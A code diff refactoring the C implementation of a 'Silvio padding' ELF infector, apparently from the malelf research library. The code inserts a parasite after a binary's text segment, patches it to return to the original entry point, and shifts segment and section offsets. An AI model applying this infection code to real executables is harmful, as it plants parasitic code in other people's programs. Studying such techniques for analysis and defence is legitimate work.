@@ -37,6 +37,7 @@
 #include <errno.h>
 #include <assert.h>
 
+#include <malelf/defines.h>
 #include <malelf/types.h>
 #include <malelf/infect.h>
 #include <malelf/util.h>
@@ -54,23 +55,26 @@ typedef struct {
         _u32 parasite_vaddr;
         _u32 target_segment;
         _u32 offset_patch_parasite;
+        _u32 magic_bytes;
 } MalelfInfect;
 
-static _u32 _malelf_infect_silvio_padding(MalelfBinary *input,
-                                          MalelfBinary *output,
-                                          MalelfInfect *infector,
-                                          Elf32_Phdr *target_phdr)
+static _u32 _malelf_infect_silvio_padding_new(MalelfInfect *infector,
+                                              MalelfBinary *output,
+                                              Elf32_Phdr *target_phdr)
 {
         _u32 error = MALELF_SUCCESS;
         _u32 end_of_text = 0;
         _u32 last_chunk = 0;
+        _u32 i;
+        MalelfBinary *parasite = infector->parasite;
+        MalelfBinary *input = infector->host;
 
         MALELF_DEBUG_INFO("Inserting parasite. Input binary '%s'"
                           "Output binary: '%s'",
                           input->fname,
                           output->fname);
 
-        error = malelf_binary_add_data(output,
+        error = malelf_binary_copy_data(output,
                                        input,
                                        0,
                                        infector->infect_offset_at);
@@ -80,7 +84,7 @@ static _u32 _malelf_infect_silvio_padding(MalelfBinary *input,
 
         if (infector->offset_patch_parasite == 0) {
                 error = malelf_patch_at_magic_byte(parasite,
-                                                   magic_bytes,
+                                                   infector->magic_bytes,
                                                    infector->host_entry_point);
                 if (MALELF_SUCCESS != error) {
                         return error;
@@ -94,7 +98,7 @@ static _u32 _malelf_infect_silvio_padding(MalelfBinary *input,
                 }
         }
 
-        error = malelf_binary_add_data(output,
+        error = malelf_binary_copy_data(output,
                                        parasite,
                                        0,
                                        parasite->size);
@@ -102,18 +106,16 @@ static _u32 _malelf_infect_silvio_padding(MalelfBinary *input,
                 return error;
         }
 
-        for (i = 0; i < (PAGE_SIZE - parasite->size); i++) {
+        for (i = 0; i < (MALELF_PAGE_SIZE - parasite->size); i++) {
                 error = malelf_binary_add_byte(output,
                                                "\x00");
         }
 
         end_of_text = target_phdr->p_offset + target_phdr->p_filesz;
 
-        assert (output->size == end_of_text);
-
         last_chunk = input->size - end_of_text;
 
-        error = malelf_binary_add_data(output,
+        error = malelf_binary_copy_data(output,
                                        input,
                                        last_chunk,
                                        input->size);
@@ -153,14 +155,14 @@ static _u8 _malelf_infect_silvio_padding(MalelfBinary* input,
         }
 
         if (offset_entry_point == 0) {
-                if ((error = malelf_patch_binary_at_magic_byte(parasite,
+                if ((error = malelf_patch_at_magic_byte(parasite,
                                                               magic_bytes,
                                                               old_e_entry))
                     != MALELF_SUCCESS) {
                         return error;
                 }
         } else {
-                if ((error = malelf_patch_binary_at(parasite,
+                if ((error = malelf_patch_at(parasite,
                                                    offset_entry_point,
                                                    old_e_entry)) != MALELF_SUCCESS) {
                         return error;
@@ -175,8 +177,8 @@ static _u8 _malelf_infect_silvio_padding(MalelfBinary* input,
         }
 
         if((c = lseek(output->fd,
-                      PAGE_SIZE - parasite->size,
-                      SEEK_CUR)) != end_of_text + PAGE_SIZE) {
+                      MALELF_PAGE_SIZE - parasite->size,
+                      SEEK_CUR)) != end_of_text + MALELF_PAGE_SIZE) {
                 return errno;
         }
 
@@ -278,7 +280,7 @@ _u32 malelf_infect_silvio_padding32_new(MalelfBinary *host,
              i < host_ehdr->e_phnum;
              i++) {
                 Elf32_Phdr *phdr = host_phdr + i;
-                phdr->p_offset += PAGE_SIZE;
+                phdr->p_offset += MALELF_PAGE_SIZE;
         }
 
         parasite_end_offset = infector.infect_offset_at +
@@ -289,7 +291,7 @@ _u32 malelf_infect_silvio_padding32_new(MalelfBinary *host,
          */
         for (i = host_ehdr->e_shnum; i-- > 0; host_shdr++) {
                 if (host_shdr->sh_offset >= parasite_end_offset) {
-                        host_shdr->sh_offset += PAGE_SIZE;
+                        host_shdr->sh_offset += MALELF_PAGE_SIZE;
                 } else {
                         /* increase the size of section that contains
                            the parasite */
@@ -301,7 +303,7 @@ _u32 malelf_infect_silvio_padding32_new(MalelfBinary *host,
 
         }
 
-        host_ehdr->e_shoff += PAGE_SIZE;
+        host_ehdr->e_shoff += MALELF_PAGE_SIZE;
 
         MALELF_DEBUG_INFO("Text segment starts at 0x%08x\n",
                           target_phdr->p_vaddr);
@@ -312,15 +314,13 @@ _u32 malelf_infect_silvio_padding32_new(MalelfBinary *host,
                           infector.infect_offset_at,
                           infector.parasite_vaddr);
 
-        infector->offset_patch_parasite = offset_entry_point;
+        infector.offset_patch_parasite = offset_entry_point;
+        infector.magic_bytes = magic_bytes;
 
-        error = _malelf_infect_silvio_padding(host,
-                                              output,
-                                              infector.infect_offset_at,
-                                              parasite,
-                                              offset_entry_point,
-                                              infector.host_entry_point,
-                                              magic_bytes);
+        error = _malelf_infect_silvio_padding_new(&infector,
+                                                  output,
+                                                  target_phdr);
+
 
         return error;
 }
@@ -354,7 +354,7 @@ _u8 malelf_infect_silvio_padding32(MalelfBinary *input,
                 if (text_found) {
                         /* shift every segment after the text
                            segment by PAGE_SIZE */
-                        phdr->p_offset += PAGE_SIZE;
+                        phdr->p_offset += MALELF_PAGE_SIZE;
                         continue;
                 } else {
                         if(phdr->p_type == PT_LOAD) {
@@ -388,7 +388,7 @@ _u8 malelf_infect_silvio_padding32(MalelfBinary *input,
          */
         for (i = ehdr->e_shnum; i-- > 0; shdr++) {
                 if (shdr->sh_offset >= after_insertion_offset)
-                        shdr->sh_offset += PAGE_SIZE;
+                        shdr->sh_offset += MALELF_PAGE_SIZE;
                 else
                         /* increase the size of section that contains
                            the parasite */
@@ -408,7 +408,7 @@ _u8 malelf_infect_silvio_padding32(MalelfBinary *input,
         MALELF_DEBUG_INFO("Inserting parasite at offset %x vaddr 0x%x\n",
                     (unsigned)end_of_text, (unsigned)parasite_vaddr);
 
-        ehdr->e_shoff += PAGE_SIZE;
+        ehdr->e_shoff += MALELF_PAGE_SIZE;
         error = _malelf_infect_silvio_padding(input,
                                               output,
                                               end_of_text,
